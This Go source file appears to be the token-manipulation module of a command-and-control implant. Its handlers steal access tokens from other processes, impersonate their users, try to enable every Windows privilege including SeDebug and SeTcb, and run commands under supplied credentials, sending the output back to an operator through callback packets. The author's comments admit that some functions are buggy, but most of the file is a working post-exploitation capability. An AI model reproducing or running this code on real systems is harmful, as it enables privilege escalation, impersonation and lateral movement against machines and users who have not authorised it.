package command

import (
	"errors"
	"fmt"
	"golang.org/x/sys/windows"
	"main/packet"
	"unsafe"
)

// storage stolen token?
var stolenToken windows.Token
var isTokenValid = false

const (
	TokenPrimary                  = 1
	TokenImpersonation            = 2
	SecurityAnonymous             = 0
	SecurityIdentification        = 1
	SecurityImpersonation         = 2
	SecurityDelegation            = 3
	LOGON32_LOGON_BATCH           = 4 // it is said that LOGON32_LOGON_BATCH will give an unrestricted token?
	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT      = 0
	LOGON_WITH_PROFILE            = 0x00000001
	LOGON_NETCREDENTIALS_ONLY     = 0x00000002
	CREATE_DEFAULT_ERROR_MODE     = 0x04000000
)

// get as many privileges as possible
var privileges = []string{"SeAssignPrimaryTokenPrivilege",
	"SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
	"SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege",
	"SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege",
	"SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
	"SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege",
	"SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege",
	"SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege",
	"SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
	"SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege",
	"SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
	"SeUndockPrivilege", "SeUnsolicitedInputPrivilege"}

// always close, no matter it is invalid or not
func closeToken(token windows.Token) error {
	if isTokenValid {
		err := windows.CloseHandle(windows.Handle(token))
		if err != nil {
			return errors.New(fmt.Sprintf("CloseHandle error: %s", err))
		}
		isTokenValid = false
	}
	return nil
}

// TODO when call createProcessWithLogonW will generate a strange error
func RunAs(b []byte) error {
	domain, username, password, cmd, err := parseRunAs(b)
	if err != nil {
		return err
	}
	lpUsername := windows.StringToUTF16Ptr(string(username))
	lpDomain := windows.StringToUTF16Ptr(string(domain))
	lpPassword := windows.StringToUTF16Ptr(string(password))
	lpCommandLine := windows.StringToUTF16Ptr(string(cmd))
	startUpInfo := &windows.StartupInfo{}
	procInfo := &windows.ProcessInformation{}
	var hWPipe windows.Handle
	var hRPipe windows.Handle
	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: nil,
		InheritHandle:      1, //true
	}

	// create anonymous pipe
	err = windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
	if err != nil {
		return errors.New(fmt.Sprintf("CreatePipe error: %s", err))
	}
	defer windows.CloseHandle(hWPipe)
	defer windows.CloseHandle(hRPipe)

	startUpInfo.Flags = windows.STARTF_USESTDHANDLES
	startUpInfo.StdErr = hWPipe
	startUpInfo.StdOutput = hWPipe

	// https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
	_, _, err = createProcessWithLogonW.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON_WITH_PROFILE, 0, uintptr(unsafe.Pointer(lpCommandLine)), CREATE_DEFAULT_ERROR_MODE, 0, uintptr(unsafe.Pointer(startUpInfo)), uintptr(unsafe.Pointer(procInfo)))
	if err != nil && err != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("CreateProcessWithLogonW error: %s", err))
	}
	defer windows.CloseHandle(procInfo.Process)
	defer windows.CloseHandle(procInfo.Thread)

	_, _ = windows.WaitForSingleObject(procInfo.Process, windows.INFINITE)
	_, _ = windows.WaitForSingleObject(procInfo.Thread, windows.INFINITE)

	buf := make([]byte, 1024*8)
	//var done uint32 = 4096
	var read windows.Overlapped
	_ = windows.ReadFile(hRPipe, buf, nil, &read)

	result := buf[:read.InternalHigh]
	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, result)
	packet.PushResult(finalPacket)
	return nil
}

func getPrivs(privs []string) (string, error) {
	result := ""
	var token windows.Token
	// try to get privileges from stolen token
	if isTokenValid {
		token = stolenToken
	} else {
		p := windows.CurrentProcess()
		err := windows.OpenProcessToken(p, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
		if err != nil {
			return result, errors.New(fmt.Sprintf("OpenProcessToken error: %s", err))
		}
	}
	LUIDs := make([]windows.LUID, len(privs))
	for i, priv := range privs {
		_ = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(priv), &LUIDs[i])
	}

	// use struct can only add one privilege, so just do some black magic
	//var b bytes.Buffer
	//_ = binary.Write(&b, binary.LittleEndian, uint32(len(privs)))
	//for _, p := range privs {
	//	_ = binary.Write(&b, binary.LittleEndian, p)
	//	_ = binary.Write(&b, binary.LittleEndian, windows.SE_PRIVILEGE_ENABLED)
	//}

	// but I need to know which privilege had set, so set one each time

	for i, LUID := range LUIDs {
		var tokenPrivileges windows.Tokenprivileges
		tokenPrivileges.PrivilegeCount = 1
		tokenPrivileges.Privileges[0] = windows.LUIDAndAttributes{
			Luid:       LUID,
			Attributes: windows.SE_PRIVILEGE_ENABLED,
		}
		_, _, err := adjustTokenPrivileges.Call(uintptr(token), 0, uintptr(unsafe.Pointer(&tokenPrivileges)), 0, 0, 0)
		if err != nil {
			if err == windows.ERROR_NOT_ALL_ASSIGNED {
				continue
			} else if err == windows.SEVERITY_SUCCESS {
				result += fmt.Sprintf("%s\n", privs[i])
			} else {
				return result, errors.New(fmt.Sprintf("AdjustTokenPrivileges error: %s", err))
			}
		}
	}
	return result, nil
}

func GetPrivsByte(b []byte) error {
	privs, err := parseGetPrivs(b)
	if err != nil {
		return err
	}
	result, err := getPrivs(privs)
	if err != nil {
		return err
	}
	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte(result))
	packet.PushResult(finalPacket)
	return nil
}

// always remember to release handle
func Rev2self() error {
	_ = closeToken(stolenToken)
	return windows.RevertToSelf()
}

func StealToken(b []byte) error {
	pid := packet.ReadInt(b)
	// getprivs first
	_, _ = getPrivs(privileges)
	ProcessHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		ProcessHandle, err = windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
		if err != nil {
			return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
		}
	}
	defer windows.CloseHandle(ProcessHandle)
	var token windows.Token
	err = windows.OpenProcessToken(ProcessHandle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &token)
	if err != nil {
		return errors.New(fmt.Sprintf("OpenProcessToken error: %s", err))
	}
	// call always return an error
	_, _, err = impersonateLoggedOnUser.Call(uintptr(token))
	defer windows.CloseHandle(windows.Handle(token))
	if err != nil && err != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("ImpersonateLoggedOnUser error: %s", err))
	}
	// maybe I should close previous token first?
	_ = closeToken(stolenToken)
	err = windows.DuplicateTokenEx(token, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, SecurityImpersonation, TokenPrimary, &stolenToken)
	if err != nil {
		return errors.New(fmt.Sprintf("DuplicateTokenEx error: %s", err))
	}
	isTokenValid = true
	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte("Steal token success"))
	packet.PushResult(finalPacket)
	return nil
}

// TODO it seems this func didn't work
func MakeToken(b []byte) error {
	domain, username, password, err := parseMakeToken(b)
	var token windows.Token
	lpUsername := windows.StringToUTF16Ptr(string(username))
	lpDomain := windows.StringToUTF16Ptr(string(domain))
	lpPassword := windows.StringToUTF16Ptr(string(password))
	// TODO using LOGON32_LOGON_BATCH always say username/password error even if i'm input correct password
	// using LOGON32_LOGON_NEW_CREDENTIALS always return no error but seems useless
	_, _, err = logonUserA.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, uintptr(unsafe.Pointer(&token)))
	if err != nil && err != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("LogonUserA error: %s", err))
	}
	_, _, err = impersonateLoggedOnUser.Call(uintptr(token))
	if err != nil && err != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("ImpersonateLoggedOnUser error: %s", err))
	}
	_ = closeToken(stolenToken)
	err = windows.DuplicateTokenEx(token, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, SecurityImpersonation, TokenPrimary, &stolenToken)
	if err != nil {
		return errors.New(fmt.Sprintf("DuplicateTokenEx error: %s", err))
	}
	isTokenValid = true
	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte("Make token success"))
	packet.PushResult(finalPacket)
	return nil
}
